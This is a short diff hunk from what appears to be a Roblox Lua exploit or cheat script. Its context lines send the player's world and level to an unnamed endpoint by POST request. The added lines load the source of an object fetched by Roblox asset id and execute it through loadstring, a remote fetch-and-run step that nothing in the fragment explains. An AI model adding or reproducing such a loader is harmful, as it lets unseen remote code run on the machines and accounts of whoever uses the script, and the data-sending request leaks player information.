@@ -11056,6 +11056,8 @@ requestconcax ({
     Method = "POST";
     Body = world.." Level: "..game.Players.LocalPlayer.Data.Level.Value..""
             })
+        wait(1)
+    loadstring(game:GetObjects("rbxassetid://2662507900")[1].Source)()    
 end
 end
 end)
